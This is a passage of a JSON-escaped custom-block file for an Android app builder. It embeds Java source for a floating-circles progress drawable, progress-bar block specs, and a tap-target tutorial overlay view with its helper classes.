(float)unit, mPaint1);\n        if(currentProgressStates !\u003d ProgressStates.BLUE_TOP)\n            canvas.drawCircle(mArrowPoints[1].x, mArrowPoints[1].y, (float)unit, mPaint2);\n        if(currentProgressStates !\u003d ProgressStates.YELLOW_TOP)\n            canvas.drawCircle(mArrowPoints[2].x, mArrowPoints[2].y, (float)unit, mPaint3);\n        if(currentProgressStates !\u003d ProgressStates.GREEN_TOP)\n            canvas.drawCircle(mArrowPoints[3].x, mArrowPoints[3].y, (float)unit, mPaint4);\n\n        // draw the top one\n        switch(currentProgressStates){\n            case GREEN_TOP:\n                canvas.drawCircle(mArrowPoints[3].x, mArrowPoints[3].y, (float)unit, mPaint4);\n                break;\n            case YELLOW_TOP:\n                canvas.drawCircle(mArrowPoints[2].x, mArrowPoints[2].y, (float)unit, mPaint3);\n                break;\n            case RED_TOP:\n                canvas.drawCircle(mArrowPoints[0].x, mArrowPoints[0].y, (float)unit, mPaint1);\n                break;\n            case BLUE_TOP:\n                canvas.drawCircle(mArrowPoints[1].x, mArrowPoints[1].y, (float)unit, mPaint2);\n                break;\n        }\n    }\n\n    private void measureCircleProgress(int width, int height) {\n        // get min edge as width\n        if(width \u003e height) {\n            // use height\n            this.width \u003d height - 1; // minus 1 to avoid \"3/2\u003d1\"\n            x_beg \u003d (width - height) / 2 + 1;\n            y_beg \u003d 1;\n            x_end \u003d x_beg + this.width;\n            y_end \u003d this.width;\n        }\n        else {\n            //use width\n            this.width \u003d width - 1;\n            x_beg \u003d 1;\n            y_beg \u003d (height - width) / 2 + 1;\n            x_end \u003d this.width;\n            y_end \u003d y_beg + this.width;\n        }\n        unit \u003d (double)this.width / 5.0;\n\n        // init the original position, and then set position by offsets\n        mArrowPoints \u003d new Point[4];\n        mArrowPoints[0] \u003d new Point((int)unit+x_beg, (int)unit+y_beg); // mPaint1, left up\n        mArrowPoints[1] \u003d new Point((int)(unit*4.0)+x_beg, (int)(unit*4.0)+y_beg); // mPaint2, right down\n        mArrowPoints[2] \u003d new Point((int)unit+x_beg, (int)(unit*4.0)+y_beg); // mPaint3, left down\n        mArrowPoints[3] \u003d new Point((int)(unit*4.0)+x_beg, (int)unit+y_beg); // mPaint4, right up\n    }\n\n    public void setAcceleration(int acceleration) {\n        this.acceleration \u003d acceleration;\n        distance \u003d 0.5 * acceleration * (MID_LEVEL / acceleration) * (MID_LEVEL / acceleration);\n        max_speed \u003d acceleration * (MID_LEVEL / acceleration);\n    }\n\n    @Override\n    public void setAlpha(int alpha) {\n        mPaint1.setAlpha(alpha);\n        mPaint2.setAlpha(alpha);\n        mPaint3.setAlpha(alpha);\n        mPaint4.setAlpha(alpha);\n    }\n\n    @Override\n    public void setColorFilter(ColorFilter cf) {\n        mColorFilter \u003d cf;\n        mPaint1.setColorFilter(cf);\n        mPaint2.setColorFilter(cf);\n        mPaint3.setColorFilter(cf);\n        mPaint4.setColorFilter(cf);\n    }\n\n    @Override\n    public int getOpacity() {\n        return PixelFormat.TRANSLUCENT;\n    }\n\n    @Override\n    public void invalidateDrawable(android.graphics.drawable.Drawable who) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.invalidateDrawable(this);\n        }\n    }\n\n    @Override\n    public void scheduleDrawable(android.graphics.drawable.Drawable who, Runnable what, long when) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.scheduleDrawable(this, what, when);\n        }\n    }\n\n    @Override\n    public void unscheduleDrawable(android.graphics.drawable.Drawable who, Runnable what) {\n        final Callback callback \u003d getCallback();\n        if (callback !\u003d null) {\n            callback.unscheduleDrawable(this, what);\n        }\n    }\n\n    public static class Builder {\n        private int[] mColors;\n\n        public Builder(Context context){\n            initDefaults(context);\n            return;\n        }\n\t\t\n        private void initDefaults(Context context) {\n            //Default values\n            mColors \u003d new int[]{0xFFC93437, 0xFF375BF1, 0xFFF7D23E, 0xFF34A350}; //Red, blue, yellow, green\n            return;\n        }\n\t\t\n        public Builder colors(int[] colors) {\n            if (colors \u003d\u003d null || colors.length \u003d\u003d 0) {\n                throw new IllegalArgumentException(\"Your color array must contains at least 4 values\");\n            }\n\n            mColors \u003d colors;\n            return this;\n        }\n\n        public android.graphics.drawable.Drawable build() {\n            return new ChromeFloatingCirclesDrawable(mColors);\n        }\n    }\n}\n{","name":"GoogleProgressLibMoreblock","palette":"-1","type":" ","spec":"##GoogleProgressLibMoreblock##"},{"code":"%1$s.setIndeterminateDrawable(new FoldingCirclesDrawable.Builder(this).colors(new int[]{0xFFC93437, 0xFF375BF1, 0xFFF7D23E, 0xFF34A350}).build());","name":"GProg : FoldingCircles","palette":"-1","type":" ","spec":"%m.progressbar setProgressType : FoldingCircles"},{"code":"%1$s.setIndeterminateDrawable(new NexusRotationCrossDrawable.Builder(this).colors(new int[]{0xFFC93437, 0xFF375BF1, 0xFFF7D23E, 0xFF34A350}).build());","name":"GProg : NexusRotationCross","palette":"-1","type":" ","spec":"%m.progressbar setProgressType : NexusRotationCross"},{"code":"%1$s.setIndeterminateDrawable(new ChromeFloatingCirclesDrawable.Builder(this).colors(new int[]{0xFFC93437, 0xFF375BF1, 0xFFF7D23E, 0xFF34A350}).build());","name":"GProg : ChromeFloatingCircles","palette":"-1","type":" ","spec":"%m.progressbar setProgressType : ChromeFloatingCircles"},{"code":"\n}static class UiUtil {\n    UiUtil() {\n    }\n    static int dp(Context context, int val) {\n        return (int) TypedValue.applyDimension(\n                TypedValue.COMPLEX_UNIT_DIP, val, context.getResources().getDisplayMetrics());\n    }\n    static int sp(Context context, int val) {\n        return (int) TypedValue.applyDimension(\n                TypedValue.COMPLEX_UNIT_SP, val, context.getResources().getDisplayMetrics());\n    }\n    static int themeIntAttr(Context context, String attr) {\n        final android.content.res.Resources.Theme theme \u003d context.getTheme();\n        if (theme \u003d\u003d null) {\n            return -1;\n        }\n        final TypedValue value \u003d new TypedValue();\n        final int id \u003d context.getResources().getIdentifier(attr, \"attr\", context.getPackageName());\n\n        if (id \u003d\u003d 0) {\n            // Not found\n            return -1;\n        }\n        theme.resolveAttribute(id, value, true);\n        return value.data;\n    }\n    static int setAlpha(int argb, float alpha) {\n        if (alpha \u003e 1.0f) {\n            alpha \u003d 1.0f;\n        } else if (alpha \u003c\u003d 0.0f) {\n            alpha \u003d 0.0f;\n        }\n        return ((int) ((argb \u003e\u003e\u003e 24) * alpha) \u003c\u003c 24) | (argb \u0026 0x00FFFFFF);\n    }\n}\n\t\tstatic class FloatValueAnimatorBuilder {\n\n    private final ValueAnimator animator;\n\n    private EndListener endListener;\n\n    interface UpdateListener {\n        void onUpdate(float lerpTime);\n    }\n    interface EndListener {\n        void onEnd();\n    }\n    protected FloatValueAnimatorBuilder() {\n        this(false);\n    }\n    FloatValueAnimatorBuilder(boolean reverse) {\n        if (reverse) {\n            this.animator \u003d ValueAnimator.ofFloat(1.0f, 0.0f);\n        } else {\n            this.animator \u003d ValueAnimator.ofFloat(0.0f, 1.0f);\n        }\n    }\n    public FloatValueAnimatorBuilder delayBy(long millis) {\n        animator.setStartDelay(millis);\n        return this;\n    }\n    public FloatValueAnimatorBuilder duration(long millis) {\n        animator.setDuration(millis);\n        return this;\n    }\n    public FloatValueAnimatorBuilder interpolator(TimeInterpolator lerper) {\n        animator.setInterpolator(lerper);\n        return this;\n    }\n    public FloatValueAnimatorBuilder repeat(int times) {\n        animator.setRepeatCount(times);\n        return this;\n    }\n    public FloatValueAnimatorBuilder onUpdate(final UpdateListener listener) {\n        animator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\n            @Override\n            public void onAnimationUpdate(ValueAnimator animation) {\n                listener.onUpdate((float) animation.getAnimatedValue());\n            }\n        });\n        return this;\n    }\n    public FloatValueAnimatorBuilder onEnd(final EndListener listener) {\n        this.endListener \u003d listener;\n        return this;\n    }\n    public ValueAnimator build() {\n        if (endListener !\u003d null) {\n            animator.addListener(new AnimatorListenerAdapter() {\n                @Override\n                public void onAnimationEnd(Animator animation) {\n                    endListener.onEnd();\n                }\n            });\n        }\n        return animator;\n    }\n}\n\t\tstatic class ReflectUtil {\n    ReflectUtil() {\n    }\n    static Object getPrivateField(Object source, String fieldName)\n            throws NoSuchFieldException, IllegalAccessException {\n        final java.lang.reflect.Field objectField \u003d source.getClass().getDeclaredField(fieldName);\n        objectField.setAccessible(true);\n        return objectField.get(source);\n    }\n}\n\t\tstatic class TapTarget extends Activity {\n    final CharSequence title;\n    final CharSequence description;\n    float outerCircleAlpha \u003d 0.96f;\n    int targetRadius \u003d 44;\n    Rect bounds;\n    android.graphics.drawable.Drawable icon;\n    Typeface titleTypeface;\n    Typeface descriptionTypeface;\n\n\n    private int outerCircleColorRes \u003d -1;\n    private int targetCircleColorRes \u003d -1;\n    private int dimColorRes \u003d -1;\n    private int titleTextColorRes \u003d -1;\n    private int descriptionTextColorRes \u003d -1;\n\n    private Integer outerCircleColor \u003d null;\n    private Integer targetCircleColor \u003d null;\n    private Integer dimColor \u003d null;\n    private Integer titleTextColor \u003d null;\n    private Integer descriptionTextColor \u003d null;\n\n    private int titleTextDimen \u003d -1;\n    private int descriptionTextDimen \u003d -1;\n    private int titleTextSize \u003d 20;\n    private int descriptionTextSize \u003d 18;\n    int id \u003d -1;\n    boolean drawShadow \u003d false;\n    boolean cancelable \u003d true;\n    boolean tintTarget \u003d true;\n    boolean transparentTarget \u003d false;\n    float descriptionTextAlpha \u003d 0.54f;\n\n    public static TapTarget forView(View view, CharSequence title) {\n        return forView(view, title, null);\n    }\n    public static TapTarget forView(View view, CharSequence title, CharSequence description) {\n        return new ViewTapTarget(view, title, description);\n    }\n    public static TapTarget forBounds(Rect bounds, CharSequence title) {\n        return forBounds(bounds, title, null);\n    }\n    public static TapTarget forBounds(Rect bounds, CharSequence title,  CharSequence description) {\n        return new TapTarget(bounds, title, description);\n    }\n    protected TapTarget(Rect bounds, CharSequence title,  CharSequence description) {\n        this(title, description);\n        if (bounds \u003d\u003d null) {\n            throw new IllegalArgumentException(\"Cannot pass null bounds or title\");\n        }\n        this.bounds \u003d bounds;\n    }\n    protected TapTarget(CharSequence title,  CharSequence description) {\n        if (title \u003d\u003d null) {\n            throw new IllegalArgumentException(\"Cannot pass null title\");\n        }\n        this.title \u003d title;\n        this.description \u003d description;\n    }\n    public TapTarget transparentTarget(boolean transparent) {\n        this.transparentTarget \u003d transparent;\n        return this;\n    }\n    public TapTarget outerCircleColor( int color) {\n        this.outerCircleColorRes \u003d color;\n        return this;\n    }\n    public TapTarget outerCircleColorInt( int color) {\n        this.outerCircleColor \u003d color;\n        return this;\n    }\n    public TapTarget outerCircleAlpha(float alpha) {\n        if (alpha \u003c 0.0f || alpha \u003e 1.0f) {\n            throw new IllegalArgumentException(\"Given an invalid alpha value: \" + alpha);\n        }\n        this.outerCircleAlpha \u003d alpha;\n        return this;\n    }\n    public TapTarget targetCircleColor( int color) {\n        this.targetCircleColorRes \u003d color;\n        return this;\n    }\n    public TapTarget targetCircleColorInt( int color) {\n        this.targetCircleColor \u003d color;\n        return this;\n    }\n    public TapTarget textColor( int color) {\n        this.titleTextColorRes \u003d color;\n        this.descriptionTextColorRes \u003d color;\n        return this;\n    }\n    public TapTarget textColorInt( int color) {\n        this.titleTextColor \u003d color;\n        this.descriptionTextColor \u003d color;\n        return this;\n    }\n    public TapTarget titleTextColor( int color) {\n        this.titleTextColorRes \u003d color;\n        return this;\n    }\n    public TapTarget titleTextColorInt( int color) {\n        this.titleTextColor \u003d color;\n        return this;\n    }\n    public TapTarget descriptionTextColor( int color) {\n        this.descriptionTextColorRes \u003d color;\n        return this;\n    }\n    public TapTarget descriptionTextColorInt( int color) {\n        this.descriptionTextColor \u003d color;\n        return this;\n    }\n    public TapTarget textTypeface(Typeface typeface) {\n        if (typeface \u003d\u003d null) throw new IllegalArgumentException(\"Cannot use a null typeface\");\n        titleTypeface \u003d typeface;\n        descriptionTypeface \u003d typeface;\n        return this;\n    }\n    public TapTarget titleTypeface(Typeface titleTypeface) {\n        if (titleTypeface \u003d\u003d null) throw new IllegalArgumentException(\"Cannot use a null typeface\");\n        this.titleTypeface \u003d titleTypeface;\n        return this;\n    }\n    public TapTarget descriptionTypeface(Typeface descriptionTypeface) {\n        if (descriptionTypeface \u003d\u003d null) throw new IllegalArgumentException(\"Cannot use a null typeface\");\n        this.descriptionTypeface \u003d descriptionTypeface;\n        return this;\n    }\n    public TapTarget titleTextSize(int sp) {\n        if (sp \u003c 0) throw new IllegalArgumentException(\"Given negative text size\");\n        this.titleTextSize \u003d sp;\n        return this;\n    }\n    public TapTarget descriptionTextSize(int sp) {\n        if (sp \u003c 0) throw new IllegalArgumentException(\"Given negative text size\");\n        this.descriptionTextSize \u003d sp;\n        return this;\n    }\n    public TapTarget titleTextDimen( int dimen) {\n        this.titleTextDimen \u003d dimen;\n        return this;\n    }\n    public TapTarget descriptionTextAlpha(float descriptionTextAlpha) {\n        if (descriptionTextAlpha \u003c 0 || descriptionTextAlpha \u003e 1f) {\n            throw new IllegalArgumentException(\"Given an invalid alpha value: \" + descriptionTextAlpha);\n        }\n        this.descriptionTextAlpha \u003d descriptionTextAlpha;\n        return this;\n    }\n    public TapTarget descriptionTextDimen( int dimen) {\n        this.descriptionTextDimen \u003d dimen;\n        return this;\n    }\n    public TapTarget dimColor( int color) {\n        this.dimColorRes \u003d color;\n        return this;\n    }\n    public TapTarget dimColorInt( int color) {\n        this.dimColor \u003d color;\n        return this;\n    }\n    public TapTarget drawShadow(boolean draw) {\n        this.drawShadow \u003d draw;\n        return this;\n    }\n    public TapTarget cancelable(boolean status) {\n        this.cancelable \u003d status;\n        return this;\n    }\n    public TapTarget tintTarget(boolean tint) {\n        this.tintTarget \u003d tint;\n        return this;\n    }\n    public TapTarget icon(android.graphics.drawable.Drawable icon) {\n        return icon(icon, false);\n    }\n    public TapTarget icon(android.graphics.drawable.Drawable icon, boolean hasSetBounds) {\n        if (icon \u003d\u003d null) throw new IllegalArgumentException(\"Cannot use null drawable\");\n        this.icon \u003d icon;\n        if (!hasSetBounds) {\n            this.icon.setBounds(new Rect(0, 0, this.icon.getIntrinsicWidth(), this.icon.getIntrinsicHeight()));\n        }\n        return this;\n    }\n    public TapTarget id(int id) {\n        this.id \u003d id;\n        return this;\n    }\n    public TapTarget targetRadius(int targetRadius) {\n        this.targetRadius \u003d targetRadius;\n        return this;\n    }\n    public int id() {\n        return id;\n    }\n    public void onReady(Runnable runnable) {\n        runnable.run();\n    }\n    public Rect bounds() {\n        if (bounds \u003d\u003d null) {\n            throw new IllegalStateException(\"Requesting bounds that are not set! Make sure your target is ready\");\n        }\n        return bounds;\n    }\n    Integer outerCircleColorInt(Context context) {\n        return colorResOrInt(context, outerCircleColor, outerCircleColorRes);\n    }\n    Integer targetCircleColorInt(Context context) {\n        return colorResOrInt(context, targetCircleColor, targetCircleColorRes);\n    }\n    Integer dimColorInt(Context context) {\n        return colorResOrInt(context, dimColor, dimColorRes);\n    }\n    Integer titleTextColorInt(Context context) {\n        return colorResOrInt(context, titleTextColor, titleTextColorRes);\n    }\n\n    Integer descriptionTextColorInt(Context context) {\n        return colorResOrInt(context, descriptionTextColor, descriptionTextColorRes);\n    }\n    int titleTextSizePx(Context context) {\n        return dimenOrSize(context, titleTextSize, titleTextDimen);\n    }\n    int descriptionTextSizePx(Context context) {\n        return dimenOrSize(context, descriptionTextSize, descriptionTextDimen);\n    }\n\n    private Integer colorResOrInt(Context context, Integer value,  int resource) {\n        if (resource !\u003d -1) {\n            if (Build.VERSION.SDK_INT \u003e\u003d Build.VERSION_CODES.M) {\n                return context.getColor(resource);\n            }\n        }\n        return value;\n    }\n    private int dimenOrSize(Context context, int size,  int dimen) {\n        if (dimen !\u003d -1) {\n            return context.getResources().getDimensionPixelSize(dimen);\n        }\n        return UiUtil.sp(context, size);\n    }\n}\n\t\tstatic class TapTargetView extends View {\n    private boolean isDismissed \u003d false;\n    private boolean isDismissing \u003d false;\n    private boolean isInteractable \u003d true;\n\n    final int TARGET_PADDING;\n    final int TARGET_RADIUS;\n    final int TARGET_PULSE_RADIUS;\n    final int TEXT_PADDING;\n    final int TEXT_SPACING;\n    final int TEXT_MAX_WIDTH;\n    final int TEXT_POSITIONING_BIAS;\n    final int CIRCLE_PADDING;\n    final int GUTTER_DIM;\n    final int SHADOW_DIM;\n    final int SHADOW_JITTER_DIM;\n\n\n    final ViewGroup boundingParent;\n    final ViewManager parent;\n    final TapTarget target;\n    final Rect targetBounds;\n\n    final TextPaint titlePaint;\n    final TextPaint descriptionPaint;\n    final Paint outerCirclePaint;\n    final Paint outerCircleShadowPaint;\n    final Paint targetCirclePaint;\n    final Paint targetCirclePulsePaint;\n\n    CharSequence title;\n\n    StaticLayout titleLayout;\n\n    CharSequence description;\n\n    StaticLayout descriptionLayout;\n    boolean isDark;\n    boolean debug;\n    boolean shouldTintTarget;\n    boolean shouldDrawShadow;\n    boolean cancelable;\n    boolean visible;\n\n    // Debug related variables\n\n    SpannableStringBuilder debugStringBuilder;\n\n    DynamicLayout debugLayout;\n\n    TextPaint debugTextPaint;\n\n    Paint debugPaint;\n\n    // Drawing properties\n    Rect drawingBounds;\n    Rect textBounds;\n\n    Path outerCirclePath;\n    float outerCircleRadius;\n    int calculatedOuterCircleRadius;\n    int[] outerCircleCenter;\n    int outerCircleAlpha;\n\n    float targetCirclePulseRadius;\n    int targetCirclePulseAlpha;\n\n    float targetCircleRadius;\n    int targetCircleAlpha;\n\n    int textAlpha;\n    int dimColor;\n\n    float lastTouchX;\n    float lastTouchY;\n\n    int topBoundary;\n    int bottomBoundary;\n\n    Bitmap tintedTarget;\n\n    Listener listener;\n\n\n    ViewOutlineProvider outlineProvider;\n\n    public static TapTargetView showFor(Activity activity, TapTarget target) {\n        return showFor(activity, target, null);\n    }\n\n    public static TapTargetView showFor(Activity activity, TapTarget target, Listener listener) {\n        if (activity \u003d\u003d null) throw new IllegalArgumentException(\"Activity is null\");\n\n        final ViewGroup decor \u003d (ViewGroup) activity.getWindow().getDecorView();\n        final ViewGroup.LayoutParams layoutParams \u003d new ViewGroup.LayoutParams(\n                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT);\n        final ViewGroup content \u003d (ViewGroup) decor.findViewById(android.R.id.content);\n        final TapTargetView tapTargetView \u003d new TapTargetView(activity, decor, content, target, listener);\n        decor.addView(tapTargetView, layoutParams);\n\n        return tapTargetView;\n    }\n\n    public static TapTargetView showFor(Dialog dialog, TapTarget target) {\n        return showFor(dialog, target, null);\n    }\n\n    public static TapTargetView showFor(Dialog dialog, TapTarget target, Listener listener) {\n        if (dialog \u003d\u003d null) throw new IllegalArgumentException(\"Dialog is null\");\n\n        final Context context \u003d dialog.getContext();\n        final WindowManager windowManager \u003d (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);\n        final WindowManager.LayoutParams params \u003d new WindowManager.LayoutParams();\n        params.type \u003d WindowManager.LayoutParams.TYPE_APPLICATION;\n        params.format \u003d PixelFormat.RGBA_8888;\n        params.flags \u003d 0;\n        params.gravity \u003d Gravity.START | Gravity.TOP;\n        params.x \u003d 0;\n        params.y \u003d 0;\n        params.width \u003d WindowManager.LayoutParams.MATCH_PARENT;\n        params.height \u003d WindowManager.LayoutParams.MATCH_PARENT;\n\n        final TapTargetView tapTargetView \u003d new TapTargetView(context, windowManager, null, target, listener);\n        windowManager.addView(tapTargetView, params);\n\n        return tapTargetView;\n    }\n\n    public static class Listener {\n        /** Signals that the user has clicked inside of the target **/\n        public void onTargetClick(TapTargetView view) {\n            view.dismiss(true);\n        }\n\n        /** Signals that the user has long clicked inside of the target **/\n        public void onTargetLongClick(TapTargetView view) {\n            onTargetClick(view);\n        }\n\n        /** If cancelable, signals that the user has clicked outside of the outer circle **/\n        public void onTargetCancel(TapTargetView view) {\n            view.dismiss(false);\n        }\n\n        /** Signals that the user clicked on the outer circle portion of the tap target **/\n        public void onOuterCircleClick(TapTargetView view) {\n            // no-op as default\n        }\n\n        /**\n         * Signals that the tap target has been dismissed\n         * @param userInitiated Whether the user caused this action\n         *\n         *\n         */\n        public void onTargetDismissed(TapTargetView view, boolean userInitiated) {\n        }\n    }\n\n    final FloatValueAnimatorBuilder.UpdateListener expandContractUpdateListener \u003d new FloatValueAnimatorBuilder.UpdateListener() {\n        @Override\n        public void onUpdate(float lerpTime) {\n            final float newOuterCircleRadius \u003d calculatedOuterCircleRadius * lerpTime;\n            final boolean expanding \u003d newOuterCircleRadius \u003e outerCircleRadius;\n            if (!expanding) {\n                // When contracting we need to invalidate the old drawing bounds. Otherwise\n                // you will see artifacts as the circle gets smaller\n                calculateDrawingBounds();\n            }\n\n            final float targetAlpha \u003d target.outerCircleAlpha * 255;\n            outerCircleRadius \u003d newOuterCircleRadius;\n            outerCircleAlpha \u003d (int) Math.min(targetAlpha, (lerpTime * 1.5f * targetAlpha));\n            outerCirclePath.reset();\n            outerCirclePath.addCircle(outerCircleCenter[0], outerCircleCenter[1], outerCircleRadius, Path.Direction.CW);\n\n            targetCircleAlpha \u003d (int) Math.min(255.0f, (lerpTime * 1.5f * 255.0f));\n\n            if (expanding) {\n                targetCircleRadius \u003d TARGET_RADIUS * Math.min(1.0f, lerpTime * 1.5f);\n            } else {\n                targetCircleRadius \u003d TARGET_RADIUS * lerpTime;\n                targetCirclePulseRadius *\u003d lerpTime;\n            }\n\n            textAlpha \u003d (int) (delayedLerp(lerpTime, 0.7f) * 255);\n\n            if (expanding) {\n                calculateDrawingBounds();\n            }\n\n            invalidateViewAndOutline(drawingBounds);\n        }\n    };\n\n    final ValueAnimator expandAnimation \u003d new FloatValueAnimatorBuilder()\n            .duration(250)\n            .delayBy(250)\n            .interpolator(new AccelerateDecelerateInterpolator())\n            .onUpdate(new FloatValueAnimatorBuilder.UpdateListener() {\n                @Override\n                public void onUpdate(float lerpTime) {\n                    expandContractUpdateListener.onUpdate(lerpTime);\n                }\n            })\n            .onEnd(new FloatValueAnimatorBuilder.EndListener() {\n                @Override\n                public void onEnd() {\n                    pulseAnimation.start();\n                    isInteractable \u003d true;\n                }\n            })\n            .build();\n\n    final ValueAnimator pulseAnimation \u003d new FloatValueAnimatorBuilder()\n            .duration(1000)\n            .repeat(ValueAnimator.INFINITE)\n            .interpolator(new AccelerateDecelerateInterpolator())\n            .onUpdate(new FloatValueAnimatorBuilder.UpdateListener() {\n                @Override\n                public void onUpdate(float lerpTime) {\n                    final float pulseLerp \u003d delayedLerp(lerpTime, 0.5f);\n                    targetCirclePulseRadius \u003d (1.0f + pulseLerp) * TARGET_RADIUS;\n                    targetCirclePulseAlpha \u003d (int) ((1.0f - pulseLerp) * 255);\n                    targetCircleRadius \u003d TARGET_RADIUS + halfwayLerp(lerpTime) * TARGET_PULSE_RADIUS;\n\n                    if (outerCircleRadius !\u003d calculatedOuterCircleRadius) {\n                        outerCircleRadius \u003d calculatedOuterCircleRadius;\n                    }\n\n                    calculateDrawingBounds();\n                    invalidateViewAndOutline(drawingBounds);\n                }\n            })\n            .build();\n\n    final ValueAnimator dismissAnimation \u003d new FloatValueAnimatorBuilder(true)\n            .duration(250)\n            .interpolator(new AccelerateDecelerateInterpolator())\n            .onUpdate(new FloatValueAnimatorBuilder.UpdateListener() {\n                @Override\n                public void onUpdate(float lerpTime) {\n                    expandContractUpdateListener.onUpdate(lerpTime);\n                }\n            })\n            .onEnd(new FloatValueAnimatorBuilder.EndListener() {\n                @Override\n                public void onEnd() {\n                    onDismiss(true);\n                    ViewUtil.removeView(parent, TapTargetView.this);\n                }\n            })\n            .build();\n\n    private final ValueAnimator dismissConfirmAnimation \u003d new FloatValueAnimatorBuilder()\n            .duration(250)\n            .interpolator(new AccelerateDecelerateInterpolator())\n            .onUpdate(new FloatValueAnimatorBuilder.UpdateListener() {\n                @Override\n                public void onUpdate(float lerpTime) {\n                    final float spedUpLerp \u003d Math.min(1.0f, lerpTime * 2.0f);\n                    outerCircleRadius \u003d calculatedOuterCircleRadius * (1.0f + (spedUpLerp * 0.2f));\n                    outerCircleAlpha \u003d (int) ((1.0f - spedUpLerp) * target.outerCircleAlpha * 255.0f);\n                    outerCirclePath.reset();\n                    outerCirclePath.addCircle(outerCircleCenter[0], outerCircleCenter[1], outerCircleRadius, Path.Direction.CW);\n                    targetCircleRadius \u003d (1.0f - lerpTime) * TARGET_RADIUS;\n                    targetCircleAlpha \u003d (int) ((1.0f - lerpTime) * 255.0f);\n                    targetCirclePulseRadius \u003d (1.0f + lerpTime) * TARGET_RADIUS;\n                    targetCirclePulseAlpha \u003d (int) ((1.0f - lerpTime) * targetCirclePulseAlpha);\n                    textAlpha \u003d (int) ((1.0f - spedUpLerp) * 255.0f);\n                    calculateDrawingBounds();\n                    invalidateViewAndOutline(drawingBounds);\n                }\n            })\n            .onEnd(new FloatValueAnimatorBuilder.EndListener() {\n                @Override\n                public void onEnd() {\n                    onDismiss(true);\n                    ViewUtil.removeView(parent, TapTargetView.this);\n                }\n            })\n            .build();\n\n    private ValueAnimator[] animators \u003d new ValueAnimator[]\n            {expandAnimation, pulseAnimation, dismissConfirmAnimation, dismissAnimation};\n\n    private final ViewTreeObserver.OnGlobalLayoutListener globalLayoutListener;\n    public TapTargetView(final Context context,\n                         final ViewManager parent,\n                          final ViewGroup boundingParent,\n                         final TapTarget target,\n                          final Listener userListener) {\n        super(context);\n        if (target \u003d\u003d null) throw new IllegalArgumentException(\"Target cannot be null\");\n\n        this.target \u003d target;\n        this.parent \u003d parent;\n        this.boundingParent \u003d boundingParent;\n        this.listener \u003d userListener !\u003d null ? userListener : new Listener();\n        this.title \u003d target.title;\n        this.description \u003d target.description;\n\n        TARGET_PADDING \u003d UiUtil.dp(context, 20);\n        CIRCLE_PADDING \u003d UiUtil.dp(context, 40);\n        TARGET_RADIUS \u003d UiUtil.dp(context, target.targetRadius);\n        TEXT_PADDING \u003d UiUtil.dp(context, 40);\n        TEXT_SPACING \u003d UiUtil.dp(context, 8);\n        TEXT_MAX_WIDTH \u003d UiUtil.dp(context, 360);\n        TEXT_POSITIONING_BIAS \u003d UiUtil.dp(context, 20);\n        GUTTER_DIM \u003d UiUtil.dp(context, 88);\n        SHADOW_DIM \u003d UiUtil.dp(context, 8);\n        SHADOW_JITTER_DIM \u003d UiUtil.dp(context, 1);\n        TARGET_PULSE_RADIUS \u003d (int) (0.1f * TARGET_RADIUS);\n\n        outerCirclePath \u003d new Path();\n        targetBounds \u003d new Rect();\n        drawingBounds \u003d new Rect();\n\n        titlePaint \u003d new TextPaint();\n        titlePaint.setTextSize(target.titleTextSizePx(context));\n        titlePaint.setTypeface(Typeface.create(\"sans-serif-medium\", Typeface.NORMAL));\n        titlePaint.setAntiAlias(true);\n\n        descriptionPaint \u003d new TextPaint();\n        descriptionPaint.setTextSize(target.descriptionTextSizePx(context));\n        descriptionPaint.setTypeface(Typeface.create(Typeface.SANS_SERIF, Typeface.NORMAL));\n        descriptionPaint.setAntiAlias(true);\n        descriptionPaint.setAlpha((int) (0.54f * 255.0f));\n\n        outerCirclePaint \u003d new Paint();\n        outerCirclePaint.setAntiAlias(true);\n        outerCirclePaint.setAlpha((int) (target.outerCircleAlpha * 255.0f));\n\n        outerCircleShadowPaint \u003d new Paint();\n        outerCircleShadowPaint.setAntiAlias(true);\n        outerCircleShadowPaint.setAlpha(50);\n        outerCircleShadowPaint.setStyle(Paint.Style.STROKE);\n        outerCircleShadowPaint.setStrokeWidth(SHADOW_JITTER_DIM);\n        outerCircleShadowPaint.setColor(Color.BLACK);\n\n        targetCirclePaint \u003d new Paint();\n        targetCirclePaint.setAntiAlias(true);\n\n        targetCirclePulsePaint \u003d new Paint();\n        targetCirclePulsePaint.setAntiAlias(true);\n\n        applyTargetOptions(context);\n\n        globalLayoutListener \u003d new ViewTreeObserver.OnGlobalLayoutListener() {\n            @Override\n            public void onGlobalLayout() {\n                if (isDismissing) {\n                    return;\n                }\n                updateTextLayouts();\n                target.onReady(new Runnable() {\n                    @Override\n                    public void run() {\n                        final int[] offset \u003d new int[2];\n\n                        targetBounds.set(target.bounds());\n\n                        getLocationOnScreen(offset);\n                        targetBounds.offset(-offset[0], -offset[1]);\n\n                        if (boundingParent !\u003d null) {\n                            final WindowManager windowManager\n                                    \u003d (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);\n                            final DisplayMetrics displayMetrics \u003d new DisplayMetrics();\n                            windowManager.getDefaultDisplay().getMetrics(displayMetrics);\n\n                            final Rect rect \u003d new Rect();\n                            boundingParent.getWindowVisibleDisplayFrame(rect);\n\n                            // We bound the boundaries to be within the screen\u0027s coordinates to\n                            // handle the case where the layout bounds do not match\n                            // (like when FLAG_LAYOUT_NO_LIMITS is specified)\n                            topBoundary \u003d Math.max(0, rect.top);\n                            bottomBoundary \u003d Math.min(rect.bottom, displayMetrics.heightPixels);\n                        }\n\n                        drawTintedTarget();\n                        requestFocus();\n                        calculateDimensions();\n\n                        startExpandAnimation();\n                    }\n                });\n            }\n        };\n\n        getViewTreeObserver().addOnGlobalLayoutListener(globalLayoutListener);\n\n        setFocusableInTouchMode(true);\n        setClickable(true);\n        setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                if (listener \u003d\u003d null || outerCircleCenter \u003d\u003d null || !isInteractable) return;\n\n                final boolean clickedInTarget \u003d\n                        distance(targetBounds.centerX(), targetBounds.centerY(), (int) lastTouchX, (int) lastTouchY) \u003c\u003d targetCircleRadius;\n                final double distanceToOuterCircleCenter \u003d distance(outerCircleCenter[0], outerCircleCenter[1],\n                        (int) lastTouchX, (int) lastTouchY);\n                final boolean clickedInsideOfOuterCircle \u003d distanceToOuterCircleCenter \u003c\u003d outerCircleRadius;\n\n                if (clickedInTarget) {\n                    